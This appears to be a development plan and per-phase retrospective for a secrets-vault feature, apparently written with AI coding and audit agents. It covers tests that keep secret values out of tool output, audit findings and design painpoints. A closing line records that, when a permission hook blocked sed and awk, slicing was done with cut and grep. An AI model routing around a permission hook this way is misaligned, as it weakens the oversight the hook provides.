- Residue tests: vault door, `DATA_DIR_ENTRIES`, AAD vectors, no tool answers a value. The
  ambient fence covers `src/gateway/vault` by construction; the helper takes its clock through
  `AskpassPorts` and the MCP side has no ambient, so neither is fenced.
- Luna audit of each phase before its push.

Shipped: the vault door and the Router fences and the AAD vectors were already in place from the
earlier phases. `data-dir-inventory.test.ts`, which the inventory's own comment named, did not
exist; it now pins every `openDurable` stem to `DATA_DIR_ENTRIES` and every entry to an opener.
`vault-tools-residue.test.ts` fences the value's roads: the tool hands it only to the child, the
run result has no value field, and the helper writes it to stdout alone. Three Luna audits ran over
the dialog, asker, and steering work: prose (one multi-line comment shortened, three doc comments
cut, one UI string trimmed to `Send and save`), tests (one redundant assertion dropped), and an
adversarial security read, which found no authorization change: a helper alone still resolves to
its own target, a session token still maps server-side to one team, the note is owner-signed and
bounded to 2048 both ways. Two low notes stand: `asker` is the helper's claim, like the brief, so
the retry line is guidance and the doc says so; `find` joins by caller, not by asker, which keeps
two concurrent runs of one command on one approval.

## Painpoints

Collected after Phase 1. Nothing here is fixed; each names the mechanism.

- Every value OwnerOp commits before `OwnerOpIntake.settle` records the nonce, so a crash between
  the two replays the signed op against changed state on repost: a `vault_delete` answers
  `entry_missing` with the tombstone, a put conflicts. Pre-existing and shared by board,
  scheduled, and capabilities. Close once by persisting the op identity in the same store batch.
- Ten tests build their own fake `OwnerServiceHooks` object. Adding `onSweep` cost ten edits, and
  the next hook member costs ten more. One `fakeHooks()` in `src/testing/` ends that.
- `gateway-bridge-inbox.test.ts` rebuilds a bridge and a registration by hand for every revocation
  and removal scenario because its `registered()` helper fixes `getDomain`. A builder taking a
  mutable Domain would halve those tests.
- `PlaybackOpsTest.enqueueOrderSurvivesPause` is timing-flaky under `Dispatchers.Unconfined`: one
  failure in the Kotlin gate, three clean reruns.
- `authorityReady` treats no leases as ready, so a harness scenario that wants a held Domain must
  register under the window first. A scenario that inherited the lease from its predecessor passed
  for the wrong reason until the red team caught it.
- `dropConnection` skips the listeners for a removed Domain, which is right for the presence
  writer and leaves `shareService`'s in-memory attestations for that Domain until the process
  ends. Small, and nothing else revisits a Domain that left the registry.
- `TerminalView.kt` still carries the multi-line comment blocks the crunch never reached, since
  no plan touched it.

Collected after Phase 2.

- `DurableStore.saveChecked` throws `DurableStoreInstalledError` after the snapshot is at its final
  name. Every checked writer must know that one exception means committed: `session-store.ts` marks
  the revision unconfirmed, the vault stores treat it as success. A `saveChecked` that returned
  `installed | durable` instead of throwing would end the per-writer catch.
- `OwnerOpIntake` records a value op's nonce after the handler commits, so a `vault_answer` reposted
  across a crash settles nothing and answers `request expired`. Same mechanism as the Phase 1 entry.
- The console sites that raced a promise against a bound timer each rebuilt the race by hand and
  each skipped the timer clear on rejection; `withinMs` replaced three of them. Two remain on the
  MCP side, in `localAgentHandlers.ts` and `refResolve.ts`, where no ambient is threaded.
- A prose Luna crunching comments removed meaning four times this lap ("Null means owner timeout"
  lost the owner; a plan status line vanished). The snapshot guard catches deletions, not a
  sentence shortened past its fact.

Collected after Phase 3.

- `PollDrain.processEntries` keys every row to a team through `parseStoreKey` or `from`, and drops
  the rest without a log line. Two gateway rows already had ids the phone could not key (the vault's
  `gateway.<id>.vault` and the key-request notice's `gateway.<id>.key-request` in
  `composeFederation.ts`, which still ships). A dropped row should at least log its kind and id.
- The plugin action contract says fast and non-blocking, but nothing enforces it and the only
  precedent (Designer) writes to memory. A plugin that needs durable state on dispatch has to pick
  between a blocking prefs commit and `apply`; there is no framework-owned durable handoff.
- The generated `VaultRequest` sealed class repeats six common fields per arm and needs six
  extension properties to read them. The codegen could lift shared fields to the base class.
- `codegen-kotlin.ts` emits `Protocol.Wire` constants only for discriminator literal sets, so an
  enum with `.meta({catalog})` (the vault decision) has no Kotlin constants and the phone keeps its
  own strings.
- The Bash tool's working directory persists across calls: one `cd android &&` made every later
  relative path (`./scripts/kotlin-gate.sh`, `bun x biome`) fail with exit 127 or "no files" until
  the paths went absolute.
- Plane versions are noted by the drain host through two roads (the socket push and the poll tick),
  so any rule about acknowledgement has to live in the repository's `applyPlane`, not the drain.

Collected after Phase 4.

- The owner outbox retires a row the Router refuses (inbox capacity), so a `retract` can be lost
  and the phone keeps that request until its deadline. Pre-existing in `consolePushOps.ts`, shared
  by every owner row.
- The principal kind rides on a string prefix: `isHelperTarget` in `requests.ts`, and the phone's
  `VaultState` and `VaultScreen` test the same `helper.` prefix. The routes hold a typed principal
  and discard it when they mint the target. A `kind` field on the request and the grant would end
  the prefix checks on both runtimes.
- The helper classifies the prompt (`secretPrompt`) and never sends it; the phone sees only the
  command line. A prompt kind on the askpass request and the request row would let the phone show
  what was asked.
- Grant ids and helper token ids both come from `ambient.newId()`, and `vault_revoke` tries grants
  first; nothing namespaces them.
- The installer copies `dist/main-vault-askpass.js`, which only a release build writes into the
  tracked `dist/`. Verifying the helper before a release means bundling to a scratch directory and
  placing the file by hand.
- `VaultPlugin` decodes each action's payload with the same five lines per action type; the plugin
  host could take a serializer beside the handler.
- The installer's first wrapper quoted the bun home inside a `${:-}` expansion, which bash keeps
  as literal quotes; the mistake surfaced only on the installed file, since no test renders the
  wrapper.
- `PlaybackOpsTest.enqueueOrderSurvivesPause` flaked once more in the Kotlin gate, clean on rerun.
- `bun build` under `--target node` bundles `zod` into the helper for one schema parse; the helper
  is 0.29 MB where a hand parse would be a few lines.

Collected after Phase 5.

- Four audit agents in a row read `runWithValue` and disagreed about whether a value could survive
  a cut. The mechanism was right twice and wrong twice, and no reader could tell which without
  running it. What made it unreadable was one flag (`truncated`) standing for two facts and one
  option (`keepRawStdout`) deciding whether a field existed. Both are gone, but the lesson is that
  a security invariant spread over a flag, an option, and three call sites cannot be reviewed.
- `routerPost` retries four times on a network error, which is right for a short call and wrong for
  a long poll. The vault tools opt out with `retries: 0` per call. A `routerPoll` that never
  retries would say it once instead of at every call site.
- The `VaultRunResult` type carries `rawStdout` for one caller. Nothing stops a future answer from
  spreading the whole result into a tool reply, which would publish it. A type that cannot be
  spread, or a capture road that never sees the result object, would close that.
- Testing a child process means real `sleep` and real byte counts. The unit file spawns about a
  dozen shells and writes a megabyte twice; it runs in under a second today, and it is the first
  thing that will get slow.
- `scrubChildEnv` lives in `mcp/devcontainer/codexTargets.ts` and is now used by the vault runner,
  which has nothing to do with devcontainers or Codex. It wants to be in `shared/`.
- The gateway's `settle` decides four things in eight lines: pending, refused, the once-only typed
  value, and the shared entry approval. It reads as a chain of guards rather than a stated policy,
  and the joined-waiter rule is only understandable next to `find`.

Collected after Phase 6.

- `dataDirInventory.ts` named `data-dir-inventory.test.ts` as the thing that pins it, and no such
  test existed. A comment that names a test is a claim nothing checks; the fence now exists, and
  its first run showed the inventory was already right by luck.
- The source-scanning fences (`vault-door`, `data-dir-inventory`, `vault-tools`) fail loudly on a
  Biome wrap that moves a name off the line the regex reads, and pass a same-kind mistake written
  another way. The tools fence is a warning beside the behavior test in `vault-tools.test.ts`, not
  a proof. A fence that walks the AST, or a behavior test per road, would end the brittleness.
- The words given to an auditor shape its findings: "proper sentences" produced eighteen semicolon
  reports, none of them a rule. Hand an auditor the rule text, not a paraphrase.
- The plan's dialog section kept two sentences describing successive states of one control, and
  the alignment audit read the pair as a contradiction. A record that supersedes should rewrite in
  place rather than append.
- `find`'s doc comment said "asker" for the caller before an `asker` field existed on the request;
  the name collision cost a security reviewer a paragraph. New wire vocabulary should be grepped
  against comments as well as code.
- Lexicon's watcher spun on the gateway's `volumes/` writes for fifty minutes at a third of a core
  each for three processes; `.gitignore` is not honored by the watch. Owned by Lexicon.
- The permission hook refuses `sed` and `awk` even for reads, so a range of a file costs a Read
  call and a pipeline that needs a slice falls back to `cut` and `grep`.
